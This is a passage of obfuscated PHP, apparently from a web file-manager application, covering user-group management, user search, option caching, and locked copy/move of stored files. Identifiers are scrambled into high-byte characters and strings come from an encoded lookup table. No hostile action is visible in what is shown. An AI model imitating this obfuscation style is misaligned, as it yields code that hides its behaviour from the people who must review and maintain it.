= $this->getInfoSimple($ôéè); if (!$Ï«ÏÜÅ || empty($˜æëı®í)) { return !1; } $ºªŒ¢‹ = array(); foreach ($˜æëı®í as $í¾ç‹Óê => $ÙÉÓ‚÷) { $ºªŒ¢‹[] = array($åÛş¤°©[1661] => $ôéè, $åÛş¤°©[1833] => $í¾ç‹Óê, $åÛş¤°©[1937] => $ÙÉÓ‚÷, $åÛş¤°©[1857] => 0); } return Model($åÛş¤°©[1923])->addAll($ºªŒ¢‹, array(), !0); } protected function userGroupRemove($ôñŸ©Šè, $Ë¦ˆ¥­Ê) { $“øÏ¯¡† =& $_SERVER[ïëó©ÒÚ]; $ì¨ç¦ßü = $this->getInfoSimple($ôñŸ©Šè); if (!$ì¨ç¦ßü || !$Ë¦ˆ¥­Ê) { return !1; } $ĞÑ—ô¨Œ = array($“øÏ¯¡†[1652] => $ôñŸ©Šè, $“øÏ¯¡†[1921] => $Ë¦ˆ¥­Ê); return Model($“øÏ¯¡†[1923])->where($ĞÑ—ô¨Œ)->delete(); } public function listData() { $ñä·Õåü = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ñä·Õåü[$_SERVER[ïëó©ÒÚ][369]]); return $ñä·Õåü; } public function listByID($²½ˆÂåñ) { $ ø ³÷ =& $_SERVER[ïëó©ÒÚ]; if (!$²½ˆÂåñ) { return; } $…ÆŞ†´ = array($ ø ³÷[1661] => array($ ø ³÷[7], $²½ˆÂåñ)); $õŠÂ¦é = $this->where($…ÆŞ†´)->select(); $õŠÂ¦é = array_sort_keep($õŠÂ¦é, $ ø ³÷[1661], $²½ˆÂåñ); $this->_listDataApply($õŠÂ¦é); return $õŠÂ¦é; } public function listByGroup($ÄÁÎ±Áä = 0, $°Ó—œ§¾ = array()) { $¼´¶¿ÉÕ =& $_SERVER[ïëó©ÒÚ]; $‹ê›ˆˆ‡ = $¼´¶¿ÉÕ[12]; $÷ÖƒÆÜî = array(); if ($ÄÁÎ±Áä) { $÷ÖƒÆÜî = array($¼´¶¿ÉÕ[2312] => intval($ÄÁÎ±Áä)); $‹ê›ˆˆ‡ = "\x4c\105\x46\124\x20\112\117\111\x4e\x20{$this->tablePrefix}\x75\163\145\162\137\147\x72\x6f\165\160\x20\165\x73\145\x72\x5f\x67\162\x6f\x75\x70\40\157\x6e\40\165\x73\x65\x72\x2e\165\163\x65\x72\111\x44\x20\x3d\x20\165\163\x65\x72\137\147\x72\157\x75\x70\56\165\163\145\162\x49\104"; $¶ıƒê±ş = Input::get($¼´¶¿ÉÕ[466], null, $¼´¶¿ÉÕ[12]) ? $¼´¶¿ÉÕ[12] : $¼´¶¿ÉÕ[2313]; } if (isset($°Ó—œ§¾[$¼´¶¿ÉÕ[760]])) { $÷ÖƒÆÜî[$¼´¶¿ÉÕ[2314]] = $°Ó—œ§¾[$¼´¶¿ÉÕ[760]]; } $Îüö„Ã = $this->_makeOrder($¶ıƒê±ş)->field($¼´¶¿ÉÕ[2315])->where($÷ÖƒÆÜî)->join($‹ê›ˆˆ‡)->selectPage(50); $this->_listDataApply($Îüö„Ã[$¼´¶¿ÉÕ[369]]); return $Îüö„Ã; } private function _makeOrder($øŒüÕ = '') { $Ù†×¢ùâ =& $_SERVER[ïëó©ÒÚ]; $°ˆÇù…¿ = array($Ù†×¢ùâ[1661], $Ù†×¢ùâ[32], $Ù†×¢ùâ[1822], $Ù†×¢ùâ[1794], $Ù†×¢ùâ[200]); $€Ò–ÑÊÚ = array($Ù†×¢ùâ[459] => $Ù†×¢ùâ[460], $Ù†×¢ùâ[461] => $Ù†×¢ùâ[462]); $Å¥õŠîª = Input::get($Ù†×¢ùâ[466], $Ù†×¢ùâ[7], $Ù†×¢ùâ[1652], $°ˆÇù…¿); $Ô¹»ìâ = Input::get($Ù†×¢ùâ[467], $Ù†×¢ùâ[7], $Ù†×¢ùâ[1924], array($Ù†×¢ùâ[1924], $Ù†×¢ùâ[461])); $Ô¹»ìâ = $€Ò–ÑÊÚ[$Ô¹»ìâ]; $øŒüÕ = $øŒüÕ . "\165\163\x65\162\x2e{$Å¥õŠîª}\x20{$Ô¹»ìâ}\54\40\165\x73\145\162\56\165\x73\145\162\111\x44\40\x61\163\143"; return $this->alias($Ù†×¢ùâ[2046])->order($øŒüÕ); } public function listSearch($áÍıïöø) { $£ş¯åù† =& $_SERVER[ïëó©ÒÚ]; $ö÷Ô•˜µ = $áÍıïöø[$£ş¯åù†[1927]]; $ÇÑÚû· = isset($áÍıïöø[$£ş¯åù†[1928]]) ? $áÍıïöø[$£ş¯åù†[1928]] : !1; $ö÷Ô•˜µ = str_replace($£ş¯åù†[1929], $£ş¯åù†[1930], trim($ö÷Ô•˜µ)); $Û¢“§Å = array($£ş¯åù†[32] => array($£ş¯åù†[383], "\45{$ö÷Ô•˜µ}\x25"), $£ş¯åù†[305] => array($£ş¯åù†[383], "{$ö÷Ô•˜µ}\45"), $£ş¯åù†[551] => array($£ş¯åù†[383], "{$ö÷Ô•˜µ}\45"), $£ş¯åù†[1003] => $£ş¯åù†[1931]); if (Input::check($ö÷Ô•˜µ, $£ş¯åù†[311])) { $Û¢“§Å[$£ş¯åù†[1661]] = array($£ş¯åù†[383], "{$ö÷Ô•˜µ}\45"); $Û¢“§Å[$£ş¯åù†[2296]] = array($£ş¯åù†[383], "{$ö÷Ô•˜µ}\45"); } if (!$ö÷Ô•˜µ) { $Û¢“§Å = array(); } if (isset($áÍıïöø[$£ş¯åù†[760]])) { $Û¢“§Å[$£ş¯åù†[760]] = $áÍıïöø[$£ş¯åù†[760]]; } $Û¢“§Å = $this->parseWhereLike($Û¢“§Å); $®ƒ¾×“¹ = $this->_makeOrder()->where($Û¢“§Å)->selectPage(20); if (!$®ƒ¾×“¹ || count($®ƒ¾×“¹[$£ş¯åù†[369]]) < 5 && Input::check($ö÷Ô•˜µ, $£ş¯åù†[318])) { $¤¹½†ò = $this->_searchFromMeta($£ş¯åù†[473], $ö÷Ô•˜µ, 10); $û¨Æ¸ìº = $this->_searchFromMeta($£ş¯åù†[474], $ö÷Ô•˜µ, 10); $‡ƒÎ–ß = array_merge($¤¹½†ò, $û¨Æ¸ìº, $®ƒ¾×“¹[$£ş¯åù†[369]]); $®ƒ¾×“¹[$£ş¯åù†[369]] = array_unique_by_key($‡ƒÎ–ß, $£ş¯åù†[1661]); $®ƒ¾×“¹[$£ş¯åù†[366]][$£ş¯åù†[367]] = count($®ƒ¾×“¹[$£ş¯åù†[369]]); $®ƒ¾×“¹[$£ş¯åù†[366]][$£ş¯åù†[368]] = ceil($®ƒ¾×“¹[$£ş¯åù†[366]][$£ş¯åù†[367]] / $®ƒ¾×“¹[$£ş¯åù†[366]][$£ş¯åù†[363]]); } $this->_listDataApply($®ƒ¾×“¹[$£ş¯åù†[369]]); $this->_filterByGroup($®ƒ¾×“¹, $ÇÑÚû·); return $®ƒ¾×“¹; } private function _filterByGroup(&$Û»™±¸ˆ, $ô”ì†¾) { $„Ô”â‰¢ =& $_SERVER[ïëó©ÒÚ]; if (!$ô”ì†¾) { return $Û»™±¸ˆ; } foreach ($Û»™±¸ˆ[$„Ô”â‰¢[369]] as $ËÌÍÈşÌ => &$¾§îµ×ğ) { $˜ËÆËíï = array_to_keyvalue($¾§îµ×ğ[$„Ô”â‰¢[2016]], $„Ô”â‰¢[12], $„Ô”â‰¢[1833]); if (!in_array($ô”ì†¾, $˜ËÆËíï)) { unset($Û»™±¸ˆ[$„Ô”â‰¢[369]][$ËÌÍÈşÌ]); } } unset($¾§îµ×ğ); $Û»™±¸ˆ[$„Ô”â‰¢[369]] = array_values($Û»™±¸ˆ[$„Ô”â‰¢[369]]); $Û»™±¸ˆ[$„Ô”â‰¢[366]] = array($„Ô”â‰¢[2080] => count($Û»™±¸ˆ[$„Ô”â‰¢[369]]), $„Ô”â‰¢[2078] => $Û»™±¸ˆ[$„Ô”â‰¢[366]][$„Ô”â‰¢[363]], $„Ô”â‰¢[2077] => 1, $„Ô”â‰¢[2079] => 1); } private function _searchFromMeta($õÚÕõè, $½Ÿìàó—, $«¡Ùé„ö) { $İ”ÀÄÜİ =& $_SERVER[ïëó©ÒÚ]; $½Ÿìàó— = strtolower($½Ÿìàó—); $ ‰¾³Üª = array($İ”ÀÄÜİ[94] => $õÚÕõè, $İ”ÀÄÜİ[374] => array($İ”ÀÄÜİ[383], "\45{$½Ÿìàó—}\x25")); $ ‰¾³Üª = $this->parseWhereLike($ ‰¾³Üª); $·‡Âô²Ú = Model($İ”ÀÄÜİ[2316])->where($ ‰¾³Üª)->limit($«¡Ùé„ö)->select(); if (!$·‡Âô²Ú) { return array(); } $·‡Âô²Ú = array_to_keyvalue($·‡Âô²Ú, $İ”ÀÄÜİ[12], $İ”ÀÄÜİ[1661]); $şÂİ·£´ = $this->where(array($İ”ÀÄÜİ[1652] => array($İ”ÀÄÜİ[7], $·‡Âô²Ú)))->select(); if (!$şÂİ·£´) { return array(); } return $şÂİ·£´; } private function _listDataApplyItem($„ÇîĞÌœ) { $åÅã”±ë = array($„ÇîĞÌœ); $this->_listDataApply($åÅã”±ë); return $åÅã”±ë[0]; } private function _listDataApply(&$Ï´·Õà) { $²Ü¡—ÎÃ =& $_SERVER[ïëó©ÒÚ]; if (!$Ï´·Õà) { return; } array_remove_key($Ï´·Õà, $²Ü¡—ÎÃ[892]); $û£˜šòì = array_to_keyvalue($Ï´·Õà, $²Ü¡—ÎÃ[12], $²Ü¡—ÎÃ[1661]); $this->_listAppendGroup($Ï´·Õà, $û£˜šòì); $this->_listAppendMeta($Ï´·Õà, $û£˜šòì); $this->_listAppendSourceRoot($Ï´·Õà, $û£˜šòì); } private function _listAppendSourceRoot(&$¦ƒÄ›¾Ó, $¾’ºâ¡³) { $Ç­‹ô© =& $_SERVER[ïëó©ÒÚ]; $®µ§˜ˆ³ = Model($Ç­‹ô©[835])->listSourceRoot(SourceModel::TYPE_USER, $¾’ºâ¡³); $®µ§˜ˆ³ = array_to_keyvalue($®µ§˜ˆ³, $Ç­‹ô©[514]); $®µ§˜ˆ³ = array_remove_key($®µ§˜ˆ³, $Ç­‹ô©[514]); foreach ($¦ƒÄ›¾Ó as &$ùà¾óòÓ) { $ùà¾óòÓ[$Ç­‹ô©[86]] = $®µ§˜ˆ³[$ùà¾óòÓ[$Ç­‹ô©[1661]]] ? $®µ§˜ˆ³[$ùà¾óòÓ[$Ç­‹ô©[1661]]] : array(); } unset($ùà¾óòÓ); } private function _listAppendGroup(&$Íş‘Êè, $ÃÓÈ‚Ó) { $‡ğ§‡† =& $_SERVER[ïëó©ÒÚ]; $ïÛ¦ÁÇ = array($‡ğ§‡†[1661] => array($‡ğ§‡†[7], $ÃÓÈ‚Ó)); $••Êªí = Model($‡ğ§‡†[1923])->where($ïÛ¦ÁÇ)->select(); $ğö¹ÇÀ = array_to_keyvalue($••Êªí, $‡ğ§‡†[12], $‡ğ§‡†[1833]); $ğö¹ÇÀ = array_remove_value(array_unique($ğö¹ÇÀ), $‡ğ§‡†[197]); if (!$ğö¹ÇÀ || !$••Êªí) { return; } $ïÛ¦ÁÇ = array($‡ğ§‡†[1833] => array($‡ğ§‡†[7], $ğö¹ÇÀ)); $à¿šßü§ = Model($‡ğ§‡†[2014])->field($‡ğ§‡†[2317])->where($ïÛ¦ÁÇ)->select(); $à¿šßü§ = array_to_keyvalue($à¿šßü§, $‡ğ§‡†[1833]); $••Êªí = array_to_keyvalue_group($••Êªí, $‡ğ§‡†[1661]); foreach ($••Êªí as &$…ÖÙòğ) { $Èë…ùüŒ = array(); foreach ($…ÖÙòğ as $ ´…†µÃ) { if (!$ ´…†µÃ[$‡ğ§‡†[1937]]) { continue; } $¾‚ˆ¼Î¥ = Model($‡ğ§‡†[516])->listData($ ´…†µÃ[$‡ğ§‡†[1937]]); $Èë…ùüŒ[] = array($‡ğ§‡†[1833] => $ ´…†µÃ[$‡ğ§‡†[1833]], $‡ğ§‡†[2318] => $à¿šßü§[$ ´…†µÃ[$‡ğ§‡†[1833]]][$‡ğ§‡†[32]], $‡ğ§‡†[530] => $à¿šßü§[$ ´…†µÃ[$‡ğ§‡†[1833]]][$‡ğ§‡†[530]], $‡ğ§‡†[422] => $¾‚ˆ¼Î¥); } $…ÖÙòğ = $Èë…ùüŒ; } unset($…ÖÙòğ); foreach ($Íş‘Êè as &$’Í¾¤ê) { $’Í¾¤ê[$‡ğ§‡†[2016]] = array(); if (isset($••Êªí[$’Í¾¤ê[$‡ğ§‡†[1661]]])) { $’Í¾¤ê[$‡ğ§‡†[2016]] = $••Êªí[$’Í¾¤ê[$‡ğ§‡†[1661]]]; } } unset($’Í¾¤ê); } public function userAppendGroup($Æ¹¼ôÜÉ) { $¥²şÍÂ =& $_SERVER[ïëó©ÒÚ]; if (!$Æ¹¼ôÜÉ) { return array(); } $this->_listAppendGroup($Æ¹¼ôÜÉ, array_to_keyvalue($Æ¹¼ôÜÉ, $¥²şÍÂ[12], $¥²şÍÂ[1661])); return $Æ¹¼ôÜÉ; } private function _listAppendMeta(&$—ıšÏ”Ù, $¿ôûØÜÁ) { $äáı–¤“ =& $_SERVER[ïëó©ÒÚ]; $Ëìº×¾ = UserJobModel::JOB_KEY; $¦ìÌÈö¿ = array($äáı–¤“[2297]); $ğªÂÊŸÕ = array($äáı–¤“[1661] => array($äáı–¤“[7], $¿ôûØÜÁ)); $òò°¡åñ = Model($äáı–¤“[2295])->where($ğªÂÊŸÕ)->select(); $òò°¡åñ = array_to_keyvalue_group($òò°¡åñ, $äáı–¤“[1661]); foreach ($òò°¡åñ as &$»ı÷î×‡) { $ÁÊ¼ïŞ‡ = array(); foreach ($»ı÷î×‡ as $õíúÙ¶€) { if (!in_array($õíúÙ¶€[$äáı–¤“[94]], $¦ìÌÈö¿)) { $ÁÊ¼ïŞ‡[$õíúÙ¶€[$äáı–¤“[94]]] = $õíúÙ¶€[$äáı–¤“[374]]; } } $»ı÷î×‡ = $ÁÊ¼ïŞ‡; } unset($»ı÷î×‡); $•äêæ† = Model($äáı–¤“[2319]); foreach ($—ıšÏ”Ù as &$›’Ï©Ğœ) { $‰¶‰¡µ³ = array(); if (isset($òò°¡åñ[$›’Ï©Ğœ[$äáı–¤“[1661]]])) { $‰¶‰¡µ³ = $òò°¡åñ[$›’Ï©Ğœ[$äáı–¤“[1661]]]; } $›’Ï©Ğœ[$äáı–¤“[2320]] = array(); if (isset($‰¶‰¡µ³[$Ëìº×¾])) { $›’Ï©Ğœ[$äáı–¤“[2320]] = $•äêæ†->getUserJobInfo($‰¶‰¡µ³[$Ëìº×¾]); } } unset($›’Ï©Ğœ); } protected function groupUserAll($°¨±î£ã) { $²œÇ’‚¤ =& $_SERVER[ïëó©ÒÚ]; if (!$°¨±î£ã) { return !1; } $èÙ³€—æ = Model($²œÇ’‚¤[1923])->field($²œÇ’‚¤[1661])->where(array($²œÇ’‚¤[1833] => array($²œÇ’‚¤[7], $°¨±î£ã)))->select(); $èÙ³€—æ = array_to_keyvalue($èÙ³€—æ, $²œÇ’‚¤[12], $²œÇ’‚¤[1661]); return array_unique($èÙ³€—æ); } public function userSearch($áÊÜ…èˆ, $³£—Ñº¼ = "\52") { return Model($_SERVER[ïëó©ÒÚ][544])->where($áÊÜ…èˆ)->field($³£—Ñº¼)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\162\137\157\x70\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Œ÷±ó×) { $ùÛØÅ ê =& $_SERVER[ïëó©ÒÚ]; if (!defined($ùÛØÅ ê[484])) { define($ùÛØÅ ê[484], 0); } return "\125\163\145\162\117\x70\x74\x69\157\x6e\x5f{$Œ÷±ó×}\x5f" . USER_ID; } protected function filterWhere($­Áª„) { $ÇÈïÙš¼ =& $_SERVER[ïëó©ÒÚ]; if (!defined($ÇÈïÙš¼[484])) { define($ÇÈïÙš¼[484], 0); } $­Áª„[$ÇÈïÙš¼[1661]] = USER_ID; return $­Áª„; } public function cacheRemoveUser($ÛÒÀÔ—, $’™ëÄ·ü) { return Cache::remove("\125\163\x65\x72\x4f\x70\x74\151\157\156\137{$ÛÒÀÔ—}\x5f" . $’™ëÄ·ü); } protected function optionDefault($ªøŒº Š = '') { $Œğíšˆ =& $_SERVER[ïëó©ÒÚ]; if ($ªøŒº Š == $Œğíšˆ[12]) { return $GLOBALS[$Œğíšˆ[6]][$Œğíšˆ[2321]]; } if ($ªøŒº Š == $Œğíšˆ[2322]) { return $GLOBALS[$Œğíšˆ[6]][$Œğíšˆ[2323]]; } } } goto F§Óõš×´; eÖ©¤¬Œ¸: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($™œå¤) { $ÚÉÆÂ‘ =& $_SERVER[ïëó©ÒÚ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÚÉÆÂ‘[564], $™œå¤); $ìÊ–ü¡ = 1; $this->_lockEvent($™œå¤, array($ÚÉÆÂ‘[565], $ÚÉÆÂ‘[566]), $ìÊ–ü¡); $this->_lockParent($™œå¤, array($ÚÉÆÂ‘[566]), $ìÊ–ü¡); $this->_lockEvent($™œå¤, array($ÚÉÆÂ‘[567], $ÚÉÆÂ‘[568]), $ìÊ–ü¡); $this->_lockCheckEnd($ÚÉÆÂ‘[564], $™œå¤); } public function lockCopyEnd($ìçßƒ‘‹) { $ ê®Ø¤ù =& $_SERVER[ïëó©ÒÚ]; if (!$this->allowLock()) { return; } $ÅïŞ’äÙ = 0; $this->_lockEvent($ìçßƒ‘‹, array($ ê®Ø¤ù[565], $ ê®Ø¤ù[566]), $ÅïŞ’äÙ); $this->_lockParent($ìçßƒ‘‹, array($ ê®Ø¤ù[566]), $ÅïŞ’äÙ); $this->_lockEvent($ìçßƒ‘‹, array($ ê®Ø¤ù[567], $ ê®Ø¤ù[568]), $ÅïŞ’äÙ); } public function lockWriteStart($ë‡ÅìÒ€, $Ê†â»ƒÌ = '') { $ı¹œÏ¶ =& $_SERVER[ïëó©ÒÚ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ı¹œÏ¶[565], $ë‡ÅìÒ€); $˜Ïö„œ = 1; $this->_lockKey($ı¹œÏ¶[569] . $ë‡ÅìÒ€ . $ı¹œÏ¶[10] . $Ê†â»ƒÌ, $˜Ïö„œ); $this->_lockEvent($ë‡ÅìÒ€, array($ı¹œÏ¶[564], $ı¹œÏ¶[566]), $˜Ïö„œ); $this->_lockParent($ë‡ÅìÒ€, array($ı¹œÏ¶[564], $ı¹œÏ¶[566]), $˜Ïö„œ); $this->_lockCheckEnd($ı¹œÏ¶[565], $ë‡ÅìÒ€); } public function lockWriteEnd($™óİçÚ¼, $ßÑÈ¥ÇÉ = '') { $Ëı˜Š´£ =& $_SERVER[ïëó©ÒÚ]; if (!$this->allowLock()) { return; } $¦¬ƒÏ— = 0; $this->_lockKey($Ëı˜Š´£[569] . $™óİçÚ¼ . $Ëı˜Š´£[10] . $ßÑÈ¥ÇÉ, $¦¬ƒÏ—); $this->_lockEvent($™óİçÚ¼, array($Ëı˜Š´£[564], $Ëı˜Š´£[566]), $¦¬ƒÏ—); $this->_lockParent($™óİçÚ¼, array($Ëı˜Š´£[564], $Ëı˜Š´£[566]), $¦¬ƒÏ—); } public function lockMoveStart($”¥œ½Ã¾) { $ù…¨€ =& $_SERVER[ïëó©ÒÚ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ù…¨€[566], $”¥œ½Ã¾); $²Æ¨Ë„‘ = 1; $this->_lockKey($ù…¨€[570] . $”¥œ½Ã¾, $²Æ¨Ë„‘); $this->_lockEvent($”¥œ½Ã¾, array($ù…¨€[564], $ù…¨€[565]), $²Æ¨Ë„‘); $this->_lockParent($”¥œ½Ã¾, array($ù…¨€[564], $ù…¨€[566]), $²Æ¨Ë„‘); $this->_lockEvent($”¥œ½Ã¾, array($ù…¨€[571], $ù…¨€[567], $ù…¨€[568]), $²Æ¨Ë„‘); $this->_lockCheckEnd($ù…¨€[566], $”¥œ½Ã¾); } public function lockMoveEnd($¤“áÌµ) { $¾–üãõ =& $_SERVER[ïëó©ÒÚ]; if (!$this->allowLock()) { return; } $ò™˜µ = 0; $this->_lockKey($¾–üãõ[570] . $¤“áÌµ, $ò™˜µ); $this->_lockEvent($¤“áÌµ, array($¾–üãõ[564], $¾–üãõ[565]), $ò™˜µ); $this->_lockParent($¤“áÌµ, array($¾–üãõ[564], $¾–üãõ[566]), $ò™˜µ); $this->_lockEvent($¤“áÌµ, array($¾–üãõ[571], $¾–üãõ[567], $¾–üãõ[568]), $ò™˜µ); } private function _lockCheck($¦Åóşâ, $ŠÓ÷¿²) { $½œ¹¸ğÑ =& $_SERVER[ïëó©ÒÚ]; $Ä„¹·¿ = $this->sourceInfo($ŠÓ÷¿²); $ßú¾®¯Â = $¦Åóşâ . $½œ¹¸ğÑ[10] . $ŠÓ÷¿²; $this->_lockTimeStart[$ßú¾®¯Â] = timeFloat(); if (!is_array($Ä„¹·¿)) { return; } $ş“€Ø‰ = LNG($½œ¹¸ğÑ[572]); CacheLock::setErrorMsg($½œ¹¸ğÑ[162] . htmlspecialchars($Ä„¹·¿[$½œ¹¸ğÑ[32]]) . $½œ¹¸ğÑ[164] . $ş“€Ø‰); $this->_lockKey($ßú¾®¯Â, 1); $this->_lockKey($ßú¾®¯Â, 0); $ÔÓë¿õû = array_reverse($this->parentLevelArray($Ä„¹·¿[$½œ¹¸ğÑ[530]])); foreach ($ÔÓë¿õû as $ç­”…²) { $ßú¾®¯Â = $¦Åóşâ . $½œ¹¸ğÑ[573] . $ç­”…²; if (CacheLock::lockGet($½œ¹¸ğÑ[574] . $ßú¾®¯Â)) { $Ä„¹·¿ = $this->sourceInfo($ç­”…²); CacheLock::setErrorMsg($½œ¹¸ğÑ[162] . htmlspecialchars($Ä„¹·¿[$½œ¹¸ğÑ[32]]) . $½œ¹¸ğÑ[164] . $ş“€Ø‰); $this->_lockKey($ßú¾®¯Â, 1); $this->_lockKey($ßú¾®¯Â, 0); } } } private function _lockCheckEnd($¦›°óÊ°, $–½§¶¯Ş) { $õô“ŸĞ­ =& $_SERVER[ïëó©ÒÚ]; $áÚ…õŒ¸ = $¦›°óÊ° . $õô“ŸĞ­[10] . $–½§¶¯Ş; CacheLock::setErrorMsg($õô“ŸĞ­[378]); if (!isset($this->_lockTimeStart[$áÚ…õŒ¸])) { return; } $ƒµù¾¹¹ = timeFloat() - $this->_lockTimeStart[$áÚ…õŒ¸]; unset($this->_lockTimeStart[$áÚ…õŒ¸]); if ($ƒµù¾¹¹ > 0.5) { unset(self::$cacheSourceInfo[$õô“ŸĞ­[469] . $–½§¶¯Ş]); } $ÃîîÖ¡ª = $this->sourceInfo($–½§¶¯Ş); if (!$ÃîîÖ¡ª) { show_json(LNG($õô“ŸĞ­[105]), !1); } } private function _lockParent($½İÃĞ¦¨, $íô„‰¤², $Ï¦§Úä) { if (!$this->autoLockSet) { return; } $©Á–æ = $this->sourceInfo($½İÃĞ¦¨); if (!is_array($©Á–æ)) { return; } $¥ÁÂ¾Ë = array_reverse($this->parentLevelArray($©Á–æ[$_SERVER[ïëó©ÒÚ][530]])); foreach ($¥ÁÂ¾Ë as $šÑ¿’ì) { $this->_lockEvent($šÑ¿’ì, $íô„‰¤², $Ï¦§Úä); } } private function _lockEvent($è¼“ëÔ , $™¶¢ñ±±, $ØÒ­ÔÁÀ) { $î›ªÖ¾ø =& $_SERVER[ïëó©ÒÚ]; if (!$this->autoLockSet) { return; } foreach ($™¶¢ñ±± as $Ûà’’„ı) { $Ä•Ö–›Ì = $Ûà’’„ı . $î›ªÖ¾ø[10] . $è¼“ëÔ ; if ($ØÒ­ÔÁÀ && CacheLock::lockGet($î›ªÖ¾ø[574] . $Ä•Ö–›Ì)) { continue; } $this->_lockKey($Ä•Ö–›Ì, $ØÒ­ÔÁÀ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ªú²Ï¸Ö, $İİÒè­Ğ = 1) { $Ş´ÛÜ·© = $_SERVER[ïëó©ÒÚ][574] . md5($ªú²Ï¸Ö); if ($İİÒè­Ğ) { if (isset(self::$_lockItemArr[$Ş´ÛÜ·©])) { return; } self::$_lockItemArr[$Ş´ÛÜ·©] = 1; CacheLock::lock($Ş´ÛÜ·©, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Ş´ÛÜ·©])) { return; } unset(self::$_lockItemArr[$Ş´ÛÜ·©]); CacheLock::unlock($Ş´ÛÜ·©); } } public function isParentOf($¢úê„ëù, $ˆ€å¦äÖ) { $—ÈÆ«› =& $_SERVER[ïëó©ÒÚ]; $‚óÆÒÄà = $this->sourceInfo($¢úê„ëù); $Ïîˆã• = $this->sourceInfo($ˆ€å¦äÖ); $¥•†”· = $‚óÆÒÄà[$—ÈÆ«›[530]] . $‚óÆÒÄà[$—ÈÆ«›[411]] . $—ÈÆ«›[50]; $ùÄ‡÷£ = $Ïîˆã•[$—ÈÆ«›[530]] . $Ïîˆã•[$—ÈÆ«›[411]] . $—ÈÆ«›[50]; $è—ï¸ = strpos($ùÄ‡÷£, $¥•†”·) === 0; return $è—ï¸; } private $targetIsDelete = 0; public function copy($Úáşä¥™, $úÃ·ÖéÁ, $îØ¢ÉÏ” = REPEAT_REPLACE, $Ô…ÏË¾– = '') { $Â ·—¸Ç =& $_SERVER[ïëó©ÒÚ]; $ğŸßä´ = $this->sourceInfo($Úáşä¥™); $çéµ‘¸ğ = $this->sourceInfo($úÃ·ÖéÁ); if (!$ğŸßä´ || !$çéµ‘¸ğ || $çéµ‘¸ğ[$Â ·—¸Ç[419]] != $Â ·—¸Ç[88]) { return !1; } if ($this->isParentOf($Úáşä¥™, $úÃ·ÖéÁ)) { return !1; } $èø³É˜Ï = $Ô…ÏË¾– ? $Ô…ÏË¾– : $ğŸßä´[$Â ·—¸Ç[32]]; $this->lockCopyStart($Úáşä¥™); $this->lockWriteStart($úÃ·ÖéÁ, $èø³É˜Ï); $æÔåïÇƒ = array($Â ·—¸Ç[575] => array(), $Â ·—¸Ç[576] => array(), $Â ·—¸Ç[577] => array()); $this->targetIsDelete = intval($ğŸßä´[$Â ·—¸Ç[440]]); $Ó¦€Ø’ = $this->fileNameExistCache($úÃ·ÖéÁ, $ğŸßä´[$Â ·—¸Ç[32]]); $ÏÆİ›ªñ = $this->_copy($Úáşä¥™, $úÃ·ÖéÁ, $îØ¢ÉÏ”, $æÔåïÇƒ, !0, $Ô…ÏË¾–); $this->_childrenListClear(); $this->lockCopyEnd($Úáşä¥™); $this->lockWriteEnd($úÃ·ÖéÁ, $èø³É˜Ï); if ($ğŸßä´[$Â ·—¸Ç[419]] == $Â ·—¸Ç[88] && $Ó¦€Ø’ == $ÏÆİ›ªñ) { $this->folderSizeResetChildren($Ó¦€Ø’); } Model($Â ·—¸Ç[578])->addAll($æÔåïÇƒ[$Â ·—¸Ç[576]], array(), !0); if ($Ó¦€Ø’ != $ÏÆİ›ªñ || $ğŸßä´[$Â ·—¸Ç[419]] == $Â ·—¸Ç[88]) { Model($Â ·—¸Ç[579])->eventCopy($ÏÆİ›ªñ); } $this->saveAll($æÔåïÇƒ[$Â ·—¸Ç[577]]); Model($Â ·—¸Ç[199])->linkAdd($æÔåïÇƒ[$Â ·—¸Ç[575]]); $this->folderSizeReset($úÃ·ÖéÁ); $this->updateModifyTime($úÃ·ÖéÁ); return $ÏÆİ›ªñ; } private function _copy($•ÊëĞÇ, $ˆÒİ‹ŞË, $Áîû«»ì, &$”—­ñ©, $òÃÊŞŒÉ, $×Óîêû¹ = '') { $Ãòêşøë =& $_SERVER[ïëó©ÒÚ]; $”ÉñìÒŞ = $this->sourceInfoCache($•ÊëĞÇ); $‰³Â…úÀ = $”ÉñìÒŞ[$Ãòêşøë[419]] == $Ãòêşøë[88]; $Şççëë = $×Óîêû¹ ? $×Óîêû¹ : $”ÉñìÒŞ[$Ãòêşøë[32]]; $‰‘“íœ = $this->fileNameExistCache($ˆÒİ‹ŞË, $Şççëë); if ($òÃÊŞŒÉ) { $this->_childrenAllMake($•ÊëĞÇ); if ($‰³Â…úÀ && $‰‘“íœ) { $this->_childrenAllMake($‰‘“íœ); } } if (!$‰‘“íœ) { return $this->_copyCreate($•ÊëĞÇ, $ˆÒİ‹ŞË, $Şççëë, $”—­ñ©); } $ÓÚ¶æßÀ = $‰‘“íœ; if ($‰³Â…úÀ) { if ($Áîû«»ì == REPEAT_RENAME_FOLDER) { $Şççëë = $this->fileNameAutoCache($ˆÒİ‹ŞË, $Şççëë, $Áîû«»ì, $‰³Â…úÀ); $ÓÚ¶æßÀ = $this->_copyCreate($•ÊëĞÇ, $ˆÒİ‹ŞË, $Şççëë, $”—­ñ©); } else { $Ø÷¹æä = $this->_childrenList($•ÊëĞÇ); foreach ($Ø÷¹æä as $«Û¼ƒü³) { $this->_copy($«Û¼ƒü³[$Ãòêşøë[411]], $‰‘“íœ, $Áîû«»ì, $”—­ñ©, !1); } } } else { if ($Áîû«»ì == REPEAT_RENAME || $Áîû«»ì == REPEAT_RENAME_FOLDER) { $Şççëë = $this->fileNameAutoCache($ˆÒİ‹ŞË, $Şççëë, $Áîû«»ì, $‰³Â…úÀ); $ÓÚ¶æßÀ = $this->_copyCreate($•ÊëĞÇ, $ˆÒİ‹ŞË, $Şççëë, $”—­ñ©); } else { if ($Áîû«»ì == REPEAT_REPLACE) { $›¡õ²Âè = $this->sourceInfoCache($‰‘“íœ); $¬’é¢¨ñ = $this->fileHistory($›¡õ²Âè, $”ÉñìÒŞ[$Ãòêşøë[477]], $”ÉñìÒŞ[$Ãòêşøë[76]]); if ($¬’é¢¨ñ) { 